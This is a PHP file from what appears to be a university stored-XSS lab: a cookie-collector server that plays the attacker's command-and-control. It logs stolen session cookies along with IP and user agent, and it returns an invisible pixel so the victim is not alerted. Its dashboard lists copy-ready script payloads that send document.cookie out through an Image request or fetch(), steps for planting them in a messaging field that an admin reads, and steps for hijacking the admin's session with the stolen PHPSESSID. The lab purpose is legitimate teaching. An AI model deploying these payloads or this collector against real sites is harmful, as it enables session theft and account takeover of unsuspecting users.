<?php
// ============================================================
//  collector.php — Serveur collecteur de cookies (attaquant)
//  P01 · XSS Stocké · Plateforme Universitaire · EMINES 2026
//
//  Ce serveur simule le serveur de l'attaquant.
//  Il reçoit les cookies volés via la requête HTTP GET,
//  les stocke dans un fichier journal et les affiche.
//
//  Payload XSS à injecter dans la messagerie :
//  <script>
//    var img = new Image();
//    img.src = "http://localhost:8888/collect?c=" + encodeURIComponent(document.cookie);
//  </script>
// ============================================================

$logFile = '/tmp/stolen_cookies.log';

// ── Réception d'un cookie volé ────────────────────────────
if (isset($_GET['c']) && $_GET['c'] !== '') {
    $ts     = date('Y-m-d H:i:s');
    $cookie = $_GET['c'];
    $ip     = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $ua     = $_SERVER['HTTP_USER_AGENT'] ?? 'unknown';
    $ref    = $_SERVER['HTTP_REFERER'] ?? '-';

    $entry = "[$ts] IP=$ip\n  COOKIE: $cookie\n  UA: $ua\n  REF: $ref\n" . str_repeat('-', 60) . "\n";
    file_put_contents($logFile, $entry, FILE_APPEND);

    // Réponse transparente (pixel 1x1 pour ne pas alerter la victime)
    header('Content-Type: image/gif');
    echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
    exit;
}

// ── Interface de l'attaquant ──────────────────────────────
$logs = file_exists($logFile) ? file_get_contents($logFile) : "Aucun cookie collecté pour l'instant.";
$lines = array_filter(explode(str_repeat('-', 60), $logs));
$entries = [];
foreach ($lines as $block) {
    $block = trim($block);
    if ($block === '') continue;
    $entries[] = $block;
}
?>
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta http-equiv="refresh" content="5">
  <title>🎯 Attacker C2 — Cookie Collector</title>
  <style>
    * { box-sizing:border-box; margin:0; padding:0; }
    body { background:#0d1117; color:#c9d1d9; font-family:'Courier New',monospace; padding:2rem; }
    h1 { color:#f85149; font-size:1.4rem; margin-bottom:.5rem; }
    .subtitle { color:#8b949e; font-size:.85rem; margin-bottom:2rem; }
    .badge { display:inline-block; background:#21262d; border:1px solid #30363d;
             padding:.2rem .6rem; border-radius:4px; font-size:.75rem; color:#8b949e; margin-right:.5rem; }
    .badge.live { border-color:#f85149; color:#f85149; animation: pulse 1s infinite; }
    @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.5} }

    .panel { background:#161b22; border:1px solid #30363d; border-radius:8px;
             padding:1.5rem; margin-bottom:1.5rem; }
    .panel h2 { color:#58a6ff; margin-bottom:1rem; font-size:1rem; }

    .entry { background:#0d1117; border:1px solid #21262d; border-left:3px solid #f85149;
             border-radius:4px; padding:1rem; margin-bottom:.8rem; font-size:.82rem; }
    .entry .ts { color:#8b949e; font-size:.75rem; }
    .entry .cookie { color:#7ee787; margin:.4rem 0; word-break:break-all; }
    .entry .ip { color:#d2a8ff; }

    .payload-box { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:1rem; }
    .payload-box pre { color:#79c0ff; font-size:.82rem; white-space:pre-wrap; word-break:break-all; }
    .tag { display:inline-block; background:#21262d; padding:.15rem .5rem; border-radius:3px;
           color:#f0883e; font-size:.8rem; }

    .no-data { color:#8b949e; font-style:italic; }
    .counter { font-size:2rem; font-weight:700; color:#f85149; }

    .steps { counter-reset:step; list-style:none; }
    .steps li { counter-increment:step; padding:.4rem 0; font-size:.85rem; }
    .steps li::before { content:counter(step)"."; color:#58a6ff; font-weight:700; margin-right:.5rem; }
  </style>
</head>
<body>

<h1>🎯 Attacker Command & Control — Cookie Collector</h1>
<p class="subtitle">
  <span class="badge live">● LIVE</span>
  <span class="badge">Rafraîchissement auto toutes les 5s</span>
  <span class="badge">Port 8888</span>
  &nbsp;— P01 XSS Stocké · EMINES UM6P 2026
</p>

<!-- Compteur -->
<div class="panel">
  <h2>📊 Statistiques</h2>
  <div class="counter"><?= count($entries) ?></div>
  <div style="color:#8b949e;font-size:.85rem;margin-top:.3rem;">cookie(s) collecté(s)</div>
</div>

<!-- Payloads -->
<div class="panel">
  <h2>💉 Payloads XSS à injecter dans la messagerie</h2>

  <p style="color:#8b949e;font-size:.85rem;margin-bottom:1rem;">
    Copiez l'un de ces payloads dans le champ <em>Message</em> de la messagerie UniPortail.
    Quand une victime lira le message, son cookie de session sera envoyé ici.
  </p>

  <p style="margin-bottom:.5rem;color:#c9d1d9;font-size:.85rem;">
    <span class="tag">Payload 1</span> — Vol de cookie via Image invisible
  </p>
  <div class="payload-box" style="margin-bottom:1rem;">
<pre>&lt;script&gt;
var img = new Image();
img.src = "http://localhost:8888/collect?c=" + encodeURIComponent(document.cookie);
&lt;/script&gt;</pre>
  </div>

  <p style="margin-bottom:.5rem;color:#c9d1d9;font-size:.85rem;">
    <span class="tag">Payload 2</span> — fetch() pour exfiltration silencieuse
  </p>
  <div class="payload-box" style="margin-bottom:1rem;">
<pre>&lt;script&gt;
fetch("http://localhost:8888/collect?c=" + encodeURIComponent(document.cookie), {mode:'no-cors'});
&lt;/script&gt;</pre>
  </div>

  <p style="margin-bottom:.5rem;color:#c9d1d9;font-size:.85rem;">
    <span class="tag">Payload 3</span> — Alert de démonstration (preuve visuelle)
  </p>
  <div class="payload-box">
<pre>&lt;script&gt;alert("XSS! Cookie: " + document.cookie);&lt;/script&gt;</pre>
  </div>
</div>

<!-- Scénario d'attaque -->
<div class="panel">
  <h2>📋 Scénario d'attaque (démo)</h2>
  <ol class="steps">
    <li>L'<strong>attaquant</strong> se connecte en tant qu'étudiant (ex: kalami@uni.ma)</li>
    <li>Il envoie un message à l'<strong>admin</strong> contenant le payload XSS dans le corps</li>
    <li>L'<strong>admin</strong> se connecte et consulte la messagerie</li>
    <li>En ouvrant le message, le script s'exécute dans son navigateur</li>
    <li>Le cookie de session de l'admin est envoyé à ce serveur collecteur</li>
    <li>L'attaquant utilise le cookie volé pour usurper la session admin</li>
  </ol>
</div>

<!-- Cookies collectés -->
<div class="panel">
  <h2>🍪 Cookies collectés (<?= count($entries) ?>)</h2>

  <?php if (empty($entries)): ?>
    <p class="no-data">Aucun cookie reçu. En attente d'une victime...</p>
  <?php else: ?>
    <?php foreach (array_reverse($entries) as $entry): ?>
    <?php
      preg_match('/\[(.*?)\]/', $entry, $ts);
      preg_match('/IP=(.*?)\n/', $entry, $ip);
      preg_match('/COOKIE: (.*?)\n/', $entry, $ck);
      preg_match('/UA: (.*?)\n/', $entry, $ua);
    ?>
    <div class="entry">
      <div class="ts">⏱ <?= htmlspecialchars($ts[1] ?? '?') ?></div>
      <div class="ip">🌐 IP : <?= htmlspecialchars(trim($ip[1] ?? '?')) ?></div>
      <div class="cookie">🍪 <?= htmlspecialchars(urldecode($ck[1] ?? '?')) ?></div>
      <div style="color:#8b949e;font-size:.75rem;">UA: <?= htmlspecialchars(trim($ua[1] ?? '?')) ?></div>
    </div>
    <?php endforeach; ?>
  <?php endif; ?>
</div>

<!-- Comment utiliser le cookie -->
<div class="panel">
  <h2>🔓 Utiliser le cookie volé (Session Hijacking)</h2>
  <ol class="steps">
    <li>Ouvrir les DevTools du navigateur (F12)</li>
    <li>Aller dans <strong>Application → Cookies → http://localhost:8080</strong></li>
    <li>Modifier la valeur de <code>PHPSESSID</code> avec la valeur volée</li>
    <li>Rafraîchir la page — vous êtes maintenant connecté en tant que la victime</li>
  </ol>
</div>

</body>
</html>
